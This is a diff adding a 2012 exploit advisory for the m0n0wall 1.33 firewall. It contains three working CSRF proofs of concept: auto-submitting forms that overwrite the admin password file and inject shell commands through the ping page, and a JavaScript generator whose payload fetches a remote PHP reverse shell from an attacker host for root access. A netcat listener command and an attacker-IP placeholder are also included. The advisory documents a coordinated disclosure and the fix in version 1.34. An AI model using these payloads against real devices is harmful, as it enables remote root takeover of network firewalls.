@@ -1,0 +1,210 @@
+######################################################################
+# Exploit Title: m0n0wall 1.33 CSRF Remote root Access
+# Date: 30/11/2012
+# Author: Yann CAM @ Synetis
+# Vendor or Software Link: m0n0.ch - m0n0.ch/wall/downloads.php
+# Version: 1.33
+# Category: CSRF Remote root Access
+# Google dork:
+# Tested on: FreeBSD
+######################################################################
+
+
+
+m0n0wall firewall/router distribution description :
+======================================================================
+
+m0n0wall is a project aimed at creating a complete, embedded firewall software package that, when used together with an embedded PC, provides all the important features of commercial firewall boxes (including ease of use) at a fraction of the price (free software).
+m0n0wall is based on a bare-bones version of FreeBSD, along with a web server, PHP and a few other utilities. The entire system configuration is stored in one single XML text file to keep things transparent.
+m0n0wall is probably the first UNIX system that has its boot-time configuration done with PHP, rather than the usual shell scripts, and that has the entire system configuration stored in XML format.
+
+In version 1.33 of the distribution, differents vulnerabilities CSRF RCE reverse root shell can be used. It is strongly advised to update to version 1.34 available now.
+
+
+
+Proof of Concept 1 :
+======================================================================
+
+CSRF exploit to reset WebGUI admin password to admin/mono (with command execution) :
+
+File /usr/local/www/exec.php line 250 :
+    $ph = popen($_POST['txtCommand'], "r" );
+
+PoC:
+
+<html>
+  <body>
+    <form name='x' action='http://m0n0wall_IP:80/exec.php' method='post'>
+      <input type='hidden' name='txtCommand' value='echo "admin:\$1\$UHzbn8k6\$RmvocDPCsXm0uW4SYZAcA/" > /usr/local/www/.htpasswd' />
+    </form>
+    <script>document.forms['x'].submit();</script>
+  </body>
+</html>
+
+
+
+Proof of Concept 2 :
+======================================================================
+
+CSRF exploit to execute arbitrary command on server :
+
+File /usr/local/www/diag_ping.php line 159 and 161 :
+    159 : system("/sbin/$pingprog -S$ifaddr -c$count " . escapeshellarg($host));
+    161 : system("/sbin/$pingprog -c$count " . escapeshellarg($host));
+
+The remote command execution through CSRF target the $count variable. This variable is defined on line 55 :
+    55 : $count = $_POST['count'];
+
+But this variable is set only if line 47 is false :
+    47 : if (($_POST['count'] < 1) || ($_POST['count'] > MAX_COUNT)) {
+
+So, if an attacker prepend his injection command with a number between 1 and 10, $count is set.
+
+You should sanitize this $count variable like :
+    if ((intval($_POST['count']) < 1) || (intval($_POST['count']) > MAX_COUNT)) {
+
+PoC :
+
+<html>
+  <body>
+    <form name='x' action='http://m0n0wall_IP:80/diag_ping.php' method='post'>
+      <input type='hidden' name='count' value='1;ls -la;' />
+      <input type='hidden' name='host' value='127.0.0.1' />
+    </form>
+    <script>document.forms['x'].submit();</script>
+  </body>
+</html>
+
+
+
+Proof of Concept 3 :
+======================================================================
+
+File /usr/local/www/exec_ram.php line 36 :
+    36 : passthru($_GET['cmd']);
+
+It's the more dangerous vulnerability. By this way, it's possible to an attacker to gain a full interactive reverse shell through a CSRF attack.
+m0n0wall is so light that none of binary file can be used to establish a reverse shell (netcat, telnet or any alternative aren't present...).
+So, to make a real reverse shell, I use PHP file. Principle is to put on the m0n0wall web server a new PHP file with several instructions to open a socket to the attacker with the /bin/sh share.
+m0n0wall PHP-CGI version is compiled with the socket library so it's relatively easy.
+The CSRF can only create a new file into the web directory on m0n0wall, but can not run this file with PHP. I have tried several syntaxe with /usr/local/bin/php (-r, -f...) to force run it, but unsuccessfull...
+So, I make a new request into the CSRF script to call this script and to establish the reverse shell.
+You can see this exploitation in this demonstration video just made as proof of concept here:
+
+    http://www.youtube.com/watch?v=It288h9VtV4
+
+CSRF generator to Reverse root shell fully interactive :
+
+<html>
+ <head>
+<script>
+function trim(s){
+return s.replace(/\r\n|\r|\n|\t/g,'').replace(/^\s+/g,'').replace(/\s+$/g,'');
+}
+ 
+function generateCSRF(){
+var target = trim(document.getElementById("target").value);
+var httpurl = trim(document.getElementById("httpurl").value);
+var resultjs = "";
+resultjs += "<html><body>";
+resultjs += "<img src='" + target + "exec_raw.php?cmd=echo%20-e%20%22%23%21/usr/local/bin/php%5Cn%3C%3Fphp%20eval%28%27%3F%3E%20%27.file_get_contents%28%27http%3A//" + httpurl + "%27%29.%27%3C%3Fphp%20%27%29%3B%20%3F%3E%22%20%3E%20x.php%3Bcat%20x.php%3Bchmod%20755%20x.php%3B' />";
+resultjs += "<script type='text/javascript'>function redirect(page){window.location=page;}setTimeout('redirect(\"" + target + "x.php\")',1000);<\/script></body></html>";
+document.getElementById("resultjs").value = resultjs;
+}
+ 
+</script>
+</head>
+ <body onload="generateCSRF();">
+ <h2>CSRF m0n0wall 1.33 to root RCE (reverse shell)</h2>
+ <p>m0n0wall 1.33, the latest firewall/router distribution based on FreeBSD is vulnerable to a CSRF attack that allows gaining root access through a reverse shell.<br />
+ The attacker must know the URL address of m0n0wall WebGui.<br />
+ To obtain the reverseshell, attacker must place a netcat in listening mode.<br />
+ On attacker machine :
+ <pre>nc -l -vv -p 1337 # Netcat listener, to gain shell control.</pre>
+ (admin hash is in the /config/config.xml file on m0n0wall, and WebGUI access is checked with /usr/local/www/.htpasswd)
+ </p>
+ <form action="" onsubmit="generateCSRF();return false;">
+ <table>
+ <tr><td>URL's m0n0wall 1.33 Targeted :</td> <td>
+ <input id="target" type="text" value="http://192.168.0.253:80/" size="70" onkeyup="generateCSRF();" /></td>
+ </tr>
+ <tr><td> HTTP URL to download php-reverse-shell.txt <br />
+ You need to download php-reverse-shell <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">here</a> !<br />
+ Edit the script to indicate :<br />
+ <pre>$ip = 'ATTACKER_IP_REVERSE_SHELL'; // CHANGE THIS
+$port = PORT_IN_LISTENING_MODE; // CHANGE THIS</pre>
+Then, rename php-reverse-shell.php to psr.txt and host it on a accessible web server.</td> <td>http://
+ <input id="httpurl" type="text" value="192.168.0.141/prs.txt" size="70" onkeyup="generateCSRF();" /></td>
+ </tr>
+ 
+<tr> <td>CSRF exploit to send to an admin : </td> <td>
+<textarea cols="70" rows="10" id="resultjs" readonly="readonly">&lt;/textarea&gt; </td>
+ </tr>
+ </table>
+ </form>
+ </body>
+</html>
+
+
+
+Solution:
+======================================================================
+2012-11-12:  Release 1.34
+
+
+
+
+Additional resources :
+======================================================================
+
+- m0n0.ch
+- www.synetis.com
+- blog.synetis.com/2012/11/19/pare-feu-routeur-m0n0wall
+- www.asafety.fr/vuln-exploit-poc/csrf-rce-m0n0wall-1-33-remote-root-access
+- www.youtube.com/watch?v=It288h9VtV4
+- pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+
+
+Report timeline :
+======================================================================
+
+2012-10-05 : Team alerted with many details, PoC, video and potential solution
+2012-10-06 : Team first response
+2012-10-18 : Team second feedback with many corrections and evolutions
+2012-10-31 : Our feedback concerning their corrections
+2012-11-01 : Final feedback from m0n0wall team with their thanks
+2012-11-12 : Release 1.34
+2012-12-06 : Public advisory
+
+
+
+Credits :
+======================================================================
+
+    88888888
+   88      888                                         88    88
+  888       88                                         88
+  788           Z88      88  88.888888     8888888   888888  88    8888888.
+   888888.       88     88   888    Z88   88     88    88    88   88     88
+       8888888    88    88   88      88  88       88   88    88   888
+            888   88   88    88      88  88888888888   88    88     888888
+  88         88    88  8.    88      88  88            88    88          888
+  888       ,88     8I88     88      88   88      88   88    88  .88     .88
+   ?8888888888.     888      88      88    88888888    8888  88   =88888888
+       888.          88
+                    88    www.synetis.com
+                 8888  Consulting firm in management and information security
+
+Yann CAM - Security Consultant @ synetis
+
+
+
+Last word :
+======================================================================
+
+Thank you to all the m0n0wall team for responsiveness, professionalism and quality solution despite of these few minor weaknesses.
+
+-- 
+SYNETIS
+CONTACT: www.synetis.com
